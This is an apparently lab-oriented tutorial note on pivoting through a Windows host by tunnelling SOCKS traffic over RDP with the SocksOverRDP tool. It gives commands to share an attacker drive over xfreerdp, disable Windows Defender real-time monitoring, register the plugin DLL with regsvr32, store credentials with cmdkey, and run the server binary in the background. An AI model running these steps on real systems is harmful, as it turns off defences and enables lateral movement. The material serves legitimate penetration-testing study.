
---
[SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses 
`Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows.
DVC is responsible for tunneling packets over the RDP connection.
#### Download appropriate binaries
1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab), look for `ProxifierPE.zip`.

Connect to the target using xfreerdp and copy the 
`SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
```bash
xfreerdp /v:<Target_IP> /u:<User> /p:<Password> /drive:shared,/home/kali/tools
```
#### Turn off Windows Defender
```powershell
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```
#### Loading SocksOverRDP.dll using regsvr32.exe
```powershell
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
#### Using `mstsc.exe`
```powershell
C:\Users\htb-student> cmdkey /add:[Target host ip] /user:[Username] /pass:[password] mstsc.exe /v:[Target host ip]
```
#### Transfer SocksOverRDP-Server.exe to Target
```powershell
C:\Users\htb-student> copy \\tsclient\[Drive_Letter]\[File Path]\SocksOverRDP-Server.exe C:\Users\[Target Username]\Desktop\
C:\Users\[Target_Username]\Desktop\SocksOverRDP-Server.exe
```
#### Execute file on Traget host with admin
```powershell
start /B C:\Users\<Username>\Desktop\SocksOverRDP-Server.exe
#start /B: run in background
```
When we see `Channel opened over RDP` on the target `cmd`, our tunnel has build.
#### Confirming the SOCKS Listener is Started on Pivot host
```powershell
C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080 

TCP    127.0.0.1:1080    0.0.0.0:0    LISTENING
```





























